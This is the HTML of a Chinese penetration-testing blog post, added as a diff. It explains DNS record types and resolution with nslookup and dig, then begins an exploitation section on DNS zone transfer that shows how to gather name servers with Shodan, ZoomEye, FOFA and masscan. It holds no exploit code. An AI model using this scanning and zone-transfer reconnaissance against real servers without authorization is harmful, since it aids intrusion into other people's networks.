@@ -1,0 +1,1247 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="前言DNS （Domain Name System， 域名系统 ），万维网上作为域名和IP地址相互映射的一个 分布式数据库，能够使用户更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。通过域名，最终得到该域名对应的IP地址的过程叫做域名解析（或主机名解析）。 基本概念根域就是所谓的“.”，其实我们的网址www.baidu.com在配置当中应该是www.baidu.com.（最后有一点）">
+<meta name="keywords" content="dns">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透测试之DNS">
+<meta property="og:url" content="https://wh0ale.github.io/2018/12/10/2018-12-10-渗透测试之DNS/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="前言DNS （Domain Name System， 域名系统 ），万维网上作为域名和IP地址相互映射的一个 分布式数据库，能够使用户更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。通过域名，最终得到该域名对应的IP地址的过程叫做域名解析（或主机名解析）。 基本概念根域就是所谓的“.”，其实我们的网址www.baidu.com在配置当中应该是www.baidu.com.（最后有一点）">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://image.3001.net/images/20181130/1543562916_5c00e6a4443a7.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181130/1543562959_5c00e6cf72ea0.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181130/1543562974_5c00e6de4e1a1.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181130/1543563034_5c00e71a3a147.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181130/1543563050_5c00e72ad5daf.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181130/1543563074_5c00e7421e712.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181130/1543563102_5c00e75ebfddd.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181130/1543563113_5c00e7699fa08.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181130/1543563161_5c00e79950182.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181130/1543563203_5c00e7c3ba73b.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181130/1543563212_5c00e7cc8e0f9.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181130/1543563247_5c00e7ef897f7.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181130/1543563264_5c00e8004e251.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181130/1543563285_5c00e815508c6.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181130/1543563310_5c00e82e577b7.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181130/1543563336_5c00e848d9f04.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181130/1543563370_5c00e86ab0237.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181130/1543563390_5c00e87ee3177.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181130/1543563429_5c00e8a5465ae.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181130/1543563447_5c00e8b7a4091.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181130/1543563487_5c00e8df1c310.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181130/1543563501_5c00e8eddd43a.png!small">
+<meta property="og:image" content="https://image.3001.net/images/20181130/1543563520_5c00e900241c7.png!small">
+<meta property="og:image" content="http://homestatic.bigsec.com/image/article/yunyingshangjiechi03.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dgy1fz9u26m9sij20gb0ckdgr.jpg">
+<meta property="og:image" content="http://s3.51cto.com/wyfs02/M00/77/EE/wKioL1ZxVCfDmzBCAABDds_fMBg567.png">
+<meta property="og:image" content="http://s3.51cto.com/wyfs02/M01/77/EE/wKioL1ZxVFaRrRCUAAAkNCrr8pk332.png">
+<meta property="og:image" content="http://s4.51cto.com/wyfs02/M01/77/EE/wKioL1ZxVJPjc6OVAAAlqIu2ruY558.png">
+<meta property="og:image" content="http://s4.51cto.com/wyfs02/M02/77/EF/wKiom1ZxVP6QDPxnAAAyy247UR8307.png">
+<meta property="og:image" content="http://s2.51cto.com/wyfs02/M00/77/EF/wKiom1ZxVSnDbwfRAAA0pfsG_MQ893.png">
+<meta property="og:image" content="http://s5.51cto.com/wyfs02/M00/77/EE/wKioL1ZxVXOhgTVrAAAnyfn9jO0629.png">
+<meta property="og:image" content="http://s1.51cto.com/wyfs02/M01/77/EE/wKioL1ZxVbqSehVZAAAfc5KpWQY299.png">
+<meta property="og:image" content="http://s4.51cto.com/wyfs02/M02/77/EE/wKioL1ZxVcjR4-EvAAEiLeIK4Ew281.png">
+<meta property="og:image" content="http://s3.51cto.com/wyfs02/M01/77/EE/wKioL1ZxVsOhpA7kAAAcoCiQ0i8280.png">
+<meta property="og:image" content="http://s5.51cto.com/wyfs02/M01/77/EF/wKiom1ZxVwOB3LuuAADs50t9Tz0802.png">
+<meta property="og:image" content="http://s1.51cto.com/wyfs02/M01/77/F0/wKiom1ZxV_iQfIouAAAWKXi2OZs330.png">
+<meta property="og:image" content="http://s3.51cto.com/wyfs02/M02/77/F0/wKiom1ZxWEmCYkZmAAF0J8BjQ0Q968.png">
+<meta property="og:image" content="http://s3.51cto.com/wyfs02/M02/77/EE/wKioL1ZxWIrDMJ43AAATAFB1rHk556.png">
+<meta property="og:image" content="http://s1.51cto.com/wyfs02/M02/77/EE/wKioL1ZxWNWQkBOKAAA6QVHP1ZM659.png">
+<meta property="og:image" content="http://s1.51cto.com/wyfs02/M02/77/F0/wKiom1ZxWQDSvk1JAALBDmQnwQM723.png">
+<meta property="og:image" content="http://s3.51cto.com/wyfs02/M01/77/F0/wKiom1ZxWffjbySJAASyBJESYFE665.png">
+<meta property="og:image" content="http://s1.51cto.com/wyfs02/M01/77/EE/wKioL1ZxWnrSNHZmAAA0KhGwnOs810.png">
+<meta property="og:image" content="http://s5.51cto.com/wyfs02/M02/77/EE/wKioL1ZxWsPh8RQvAACQeQDHVpc930.png">
+<meta property="og:image" content="http://homestatic.bigsec.com/image/article/yunyingshangjiechi04.jpg">
+<meta property="og:image" content="http://homestatic.bigsec.com/image/article/yunyingshangjiechi05.png">
+<meta property="og:updated_time" content="2019-12-03T06:04:33.292Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="渗透测试之DNS">
+<meta name="twitter:description" content="前言DNS （Domain Name System， 域名系统 ），万维网上作为域名和IP地址相互映射的一个 分布式数据库，能够使用户更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。通过域名，最终得到该域名对应的IP地址的过程叫做域名解析（或主机名解析）。 基本概念根域就是所谓的“.”，其实我们的网址www.baidu.com在配置当中应该是www.baidu.com.（最后有一点）">
+<meta name="twitter:image" content="https://image.3001.net/images/20181130/1543562916_5c00e6a4443a7.png!small">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2018/12/10/2018-12-10-渗透测试之DNS/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>渗透测试之DNS | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2018/12/10/2018-12-10-渗透测试之DNS/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">渗透测试之DNS
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-12-10 00:00:00" itemprop="dateCreated datePublished" datetime="2018-12-10T00:00:00+08:00">2018-12-10</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-12-03 14:04:33" itemprop="dateModified" datetime="2019-12-03T14:04:33+08:00">2019-12-03</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">12k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">11 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>DNS （Domain Name System， 域名系统 ），万维网上作为域名和IP地址相互映射的一个 分布式数据库，能够使用户更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。通过域名，最终得到该域名对应的IP地址的过程叫做域名解析（或主机名解析）。</strong></p>
+<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="根域"><a href="#根域" class="headerlink" title="根域"></a>根域</h3><p>就是所谓的“.”，其实我们的网址<a href="http://www.baidu.com/" target="_blank" rel="noopener">www.baidu.com</a>在配置当中应该是<a href="http://www.baidu.com./" target="_blank" rel="noopener">www.baidu.com.</a>（最后有一点），一般我们在浏览器里输入时会省略后面的点，而这也已经成为了习惯。</p>
+<p>根域服务器我们知道有13台，但是这是错误的观点。</p>
+<p>根域服务器只是具有13个IP地址，但机器数量却不是13台，因为这些IP地址借助了任播的技术，所以我们可以在全球设立这些IP的镜像站点，你访问到的这个IP并不是唯一的那台主机。具体的镜像分布可以参考维基百科。这些主机的内容都是一样的。</p>
+<h3 id="域的划分"><a href="#域的划分" class="headerlink" title="域的划分"></a>域的划分</h3><p>根域下来就是顶级域或者叫一级域。</p>
+<p>有两种划分方式，一种是互联网刚兴起时的按照行业性质划分的com.，net.等，一种是按国家划分的如cn.，jp.，等。每个域都会有域名服务器，也叫权威域名服务器。</p>
+<p>Baidu.com就是一个顶级域名，而<a href="http://www.baidu.com/" target="_blank" rel="noopener">www.baidu.com</a>却不是顶级域名，他是在baidu.com 这个域里的一叫做www的主机。</p>
+<p>一级域之后还有二级域，三级域，只要我买了一个顶级域，并且我搭建了自己BIND服务器（或者其他软件搭建的）注册到互联网中，那么我就可以随意在前面多加几个域了（当然长度是有限制的）。</p>
+<p>比如a.<a href="http://www.baidu.com/" target="_blank" rel="noopener">www.baidu.com</a>，在这个网址中，<a href="http://www.baidu.com/" target="_blank" rel="noopener">www.baidu.com</a>变成了一个二级域而不是一台主机，主机名是a。</p>
+<h3 id="域名服务器"><a href="#域名服务器" class="headerlink" title="域名服务器"></a>域名服务器</h3><p>能提供域名解析的服务器，上面的记录类型可以是A(address)记录，NS记录（name server），MX（mail），CNAME等。</p>
+<p>接下来讲解具体的记录类型：</p>
+<p><strong>A记录（Address）</strong></p>
+<p>A 记录也称为主机记录，是使用最广泛的DNS记录，A记录的基本作用就是说明一个域名对应的IP是多少， 它是域名和IP地址的对应关系，表现形式为 <a href="http://www.baidu.com/" target="_blank" rel="noopener">www.baidu.com</a> 119.75.217.109 , 这就是一个A记录！A记录除了进行域名IP对应以外，还有一个高级用法，可以作为低成本的负载均衡的解决方案，比如说，<a href="http://www.baidu.com/" target="_blank" rel="noopener">www.baidu.com</a>可以创建多个A记录，对应多台物理服务器的IP地址，可以实现基本的流量均衡！)。</p>
+<p>比如说笔者这里设置的A记录：</p>
+<p><a href="https://image.3001.net/images/20181130/1543562916_5c00e6a4443a7.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181130/1543562916_5c00e6a4443a7.png!small" alt="img"></a></p>
+<p><strong>NS 记录（Name Server）</strong></p>
+<p>NS 记录和SOA记录是任何一个DNS区域都不可或缺的两条记录，NS记录也叫名称<code>服务器记录</code>，用于说明这个区域有哪些DNS服务器负责解析，SOA记录说明负责解析的DNS服务器中哪一个是主服务器。因此，任何一个DNS区域都不可能缺少这两条记录。NS记录，说明了在这个区域里，有多少个服务器来承担解析的任务。</p>
+<p><strong>SOA 记录（Start ofAuthority）</strong></p>
+<p>NS 记录说明了有多台服务器在进行解析，但哪一个才是主服务器呢，NS并没有说明，这个就要看SOA记录了，SOA名叫<code>起始授权机构记录</code>，SOA记录说明了在众多NS记录里那一台才是主要的服务器。</p>
+<p><strong>MX 记录（ Mail Exchanger ）</strong></p>
+<p>全称是<code>邮件交换记录</code>，在使用邮件服务器的时候，MX记录是无可或缺的，比如A用户向B用户发送一封邮件，那么他需要向ＤＮＳ查询Ｂ的MX记录，DNS在定位到了B的MX记录后反馈给A用户，然后Ａ用户把邮件投递到B用户的ＭＸ记录服务器里。</p>
+<p><strong>CNAME 记录</strong></p>
+<p>别名记录。这种记录允许<strong>您将多个名字映射到另外一个域名</strong>。通常用于同时提供WWW和MAIL服务的计算机。例如，有一台计算机名为“host.mydomain.com”（A记录）。它同时提供WWW和MAIL服务，为了便于用户访问服务。可以为该计算机设置两个别名（CNAME）：WWW和MAIL。这两个别名的全称就<a href="http://www.mydomain.com/%E5%92%8C%E2%80%9Cmail.mydomain.com%E2%80%9D%E3%80%82%E5%AE%9E%E9%99%85%E4%B8%8A%E4%BB%96%E4%BB%AC%E9%83%BD%E6%8C%87%E5%90%91" target="_blank" rel="noopener">http://www.mydomain.com/ 和“mail.mydomain.com”</a>。实际上他们都指向“<a href="http://host.mydomain.com/" target="_blank" rel="noopener">host.mydomain.com</a>”。</p>
+<p><strong>SRV 记录</strong></p>
+<p>SRV 记录的作用是指明某域名下提供的服务。</p>
+<p>例如：</p>
+<p>_http._tcp.example.com. SRV 10 5 80. <a href="http://www.example.com/" target="_blank" rel="noopener">www.example.com</a></p>
+<p>SRV 后面项目的含义：</p>
+<blockquote>
+<p>10 – 优先级，类似 MX 记录</p>
+<p>5 – 权重</p>
+<p>80 – 端口</p>
+</blockquote>
+<p><a href="http://www.example.com/" target="_blank" rel="noopener">www.example.com</a> – 实际提供服务的主机名。</p>
+<p><strong>PTR 记录</strong></p>
+<p>PTR 记录也被称为<code>指针记录</code>， PTR 记录是 A 记录的逆向记录，作用是把 IP 地址解析为域名。由于我们在前面提到过， DNS 的反向区域负责从 IP 到域名的解析，因此如果要创建 PTR 记录，必须在反向区域中创建。</p>
+<p>ip 反查域名： <a href="https://dns.aizhan.com/119.75.217.109/" target="_blank" rel="noopener">https://dns.aizhan.com/103.43.134.210/</a></p>
+<h2 id="解析过程"><a href="#解析过程" class="headerlink" title="解析过程"></a>解析过程</h2><blockquote>
+<ol>
+<li>现在我有一台计算机，通过ISP接入了互联网，那么ISP就会给我分配一个DNS服务器，这个DNS服务器不是权威服务器，而是相当于一个代理的dns解析服务器，他会帮你迭代权威服务器返回的应答，然后把最终查到IP返回给你。(dns 迭代放大攻击有提到过)</li>
+<li>现在的我计算机要向这台ISPDNS发起请求查询<a href="http://www.baidu.com/" target="_blank" rel="noopener">www.baidu.com</a>这个域名了，(经网友提醒：这里其实准确来说不是ISPDNS，而应该是用户自己电脑网络设置里的DNS，并不一定是ISPDNS。比如也有可能你手工设置了8.8.8.8)</li>
+<li>ISPDNS拿到请求后，先检查一下自己的缓存中有没有这个地址，有的话就直接返回。这个时候拿到的ip地址，会被标记为非权威服务器的应答。</li>
+<li>如果缓存中没有的话，ISPDNS会从配置文件里面读取13个根域名服务器的地址（这些地址是不变的，直接在BIND的配置文件中）。</li>
+<li>然后像其中一台发起请求。</li>
+<li>根服务器拿到这个请求后，知道他是com.这个顶级域名下的，所以就会返回com域中的NS记录，一般来说是13台主机名和IP。</li>
+<li>然后ISPDNS向其中一台再次发起请求，com域的服务器发现你这请求是baidu.com这个域的，我一查发现了这个域的NS，那我就返回给你，你再去查。（目前百度有5台baidu.com的顶级域名服务器）。</li>
+<li>ISPDNS不厌其烦的再次向baidu.com这个域的权威服务器发起请求，baidu.com收到之后，查了下有www的这台主机，就把这个IP返回给你了。</li>
+<li>然后ISPDNS拿到了之后，将其返回给了客户端，并且把这个保存在高速缓存中。</li>
+</ol>
+</blockquote>
+<h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><h3 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h3><p>笔者目前使用的kali虚拟机，下载连接：<a href="https://www.kali.org/downloads/" target="_blank" rel="noopener">https://www.kali.org/downloads/</a></p>
+<p><a href="https://image.3001.net/images/20181130/1543562959_5c00e6cf72ea0.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181130/1543562959_5c00e6cf72ea0.png!small" alt="img"></a></p>
+<p><a href="https://image.3001.net/images/20181130/1543562974_5c00e6de4e1a1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181130/1543562974_5c00e6de4e1a1.png!small" alt="img"></a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">第一行Server是： DNS服务器的主机名	 –218.2.135.1</span><br><span class="line"></span><br><span class="line">第二行Address是： 服务器的ip地址		 –218.2.135.1#53</span><br><span class="line"></span><br><span class="line">非全未应答（Non-authoritative answer）：</span><br><span class="line"></span><br><span class="line">Name是：解析的URL www.lengbsikai.net</span><br><span class="line"></span><br><span class="line">Address是：103.43.134.210</span><br></pre></td></tr></table></figure>
+
+<p>第二幅图百度的解析比较复杂一点：</p>
+<p>多出一个CNAME记录：<a href="http://www.a.shifen.com/" target="_blank" rel="noopener">www.a.shifen.com</a></p>
+<h3 id="Dig"><a href="#Dig" class="headerlink" title="Dig"></a>Dig</h3><p>接着上面分析。</p>
+<p>通过dig迭代追踪查看一下：</p>
+<p><a href="https://image.3001.net/images/20181130/1543563034_5c00e71a3a147.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181130/1543563034_5c00e71a3a147.png!small" alt="img"></a></p>
+<p>第一步是向我这台机器的ISPDNS（218.2.135.1）获取到根域服务区的13个IP和主机名[a-m].root-servers.net.。</p>
+<p><a href="https://image.3001.net/images/20181130/1543563050_5c00e72ad5daf.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181130/1543563050_5c00e72ad5daf.png!small" alt="img"></a></p>
+<p>第二步是向其中的一台根域服务器（Servername就是末行小括号里的 ip:198.97.190.53#53（h.root-servers.net））发送<a href="http://www.baidu.com/" target="_blank" rel="noopener">www.baidu.com</a>的查询请求，他返回了com.顶级域的服务器IP（未显示）和名称。</p>
+<p><a href="https://image.3001.net/images/20181130/1543563074_5c00e7421e712.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181130/1543563074_5c00e7421e712.png!small" alt="img"></a></p>
+<p>第三步，便向com.域的一台服务器192.54.112.30#53请求<a href="http://www.baidu.com/" target="_blank" rel="noopener">www.baidu.com</a>，他返回了baidu.com域的服务器IP（未显示）和名称，百度有五台顶级域的服务器</p>
+<p>[此处可以用<code>dig @192.54.112.30 www.baidu.com</code>  查看返回的百度顶级域名服务器IP地址】。</p>
+<p><a href="https://image.3001.net/images/20181130/1543563102_5c00e75ebfddd.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181130/1543563102_5c00e75ebfddd.png!small" alt="img"></a></p>
+<p><a href="https://image.3001.net/images/20181130/1543563113_5c00e7699fa08.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181130/1543563113_5c00e7699fa08.png!small" alt="img"></a></p>
+<p>（ps:这个时候是能看到拜读顶级服务器对应的ip地址的。）</p>
+<p>第四步，向百度的顶级服务器（220.181.37.10）请求<a href="http://www.baidu.com/" target="_blank" rel="noopener">www.baidu.com</a>，他发现这个www有个别名，而不是一台主机，别名是<code>www.a.shifen.com</code>。</p>
+<p><a href="https://image.3001.net/images/20181130/1543563161_5c00e79950182.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181130/1543563161_5c00e79950182.png!small" alt="img"></a></p>
+<p>看到上面的情况，问题就来了，按照一般的逻辑，当dns请求到别名的时候，查询会终止，而是重新发起查询别名的请求，所以此处应该返回的只是<a href="http://www.a.shifen.com/" target="_blank" rel="noopener">www.a.shifen.com</a>。但是为什么返回a.shifen.com的这个域的NS呢？</p>
+<p>同样用dig来追踪一下看看：</p>
+<p><a href="https://image.3001.net/images/20181130/1543563203_5c00e7c3ba73b.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181130/1543563203_5c00e7c3ba73b.png!small" alt="img"></a></p>
+<p><a href="https://image.3001.net/images/20181130/1543563212_5c00e7cc8e0f9.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181130/1543563212_5c00e7cc8e0f9.png!small" alt="img"></a></p>
+<p>第三步的时候发现<code>shifen.com</code>这个顶级域名的域名服务器和<code>baidu.com</code>这个域的域名服务器是同一台主机。（dns.baidu.com）</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="DNS域传送（DNS-Zone-Transfer-）"><a href="#DNS域传送（DNS-Zone-Transfer-）" class="headerlink" title="DNS域传送（DNS Zone Transfer ）"></a>DNS域传送（DNS Zone Transfer ）</h3><p>DNS 服务器分为： 主服务器、备份服务器和缓存服务器。域传送是指后备服务器从主服务器拷贝数据，并用得到的数据更新自身数据库。 在主备服务器之间同步数据库，需要使用 “DNS 域传送 ” 。</p>
+<p>由于DNS协议 运行在 UDP 协议 之上，使用端口号53，所以可以使用一些特殊的搜索引擎来快速获取目标。</p>
+<p>利用网络空间搜索引擎收集域名服务器：</p>
+<p><strong>Shodan(<a href="https://www.shodan.io" target="_blank" rel="noopener">https://www.shodan.io</a>)</strong></p>
+<p><a href="https://image.3001.net/images/20181130/1543563247_5c00e7ef897f7.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181130/1543563247_5c00e7ef897f7.png!small" alt="img"></a></p>
+<p><strong>Zoomeye(<a href="https://www.zoomeye.org" target="_blank" rel="noopener">https://www.zoomeye.org</a>)</strong></p>
+<p><a href="https://image.3001.net/images/20181130/1543563264_5c00e8004e251.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181130/1543563264_5c00e8004e251.png!small" alt="img"></a></p>
+<p><strong>fofa （<a href="https://fofa.so）" target="_blank" rel="noopener">https://fofa.so）</a></strong></p>
+<p><a href="https://image.3001.net/images/20181130/1543563285_5c00e815508c6.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181130/1543563285_5c00e815508c6.png!small" alt="img"></a></p>
+<p>利用masscan搜集DNS服务器：</p>
+<p><a href="https://image.3001.net/images/20181130/1543563310_5c00e82e577b7.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181130/1543563310_5c00e82e577b7.png!small" alt="img"></a></p>
+<p>对ns.xml结果去重：</p>
+<p><a href="https://image.3001.net/images/20181130/1543563336_5c00e848d9f04.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181130/1543563336_5c00e848d9f04.png!small" alt="img"></a></p>
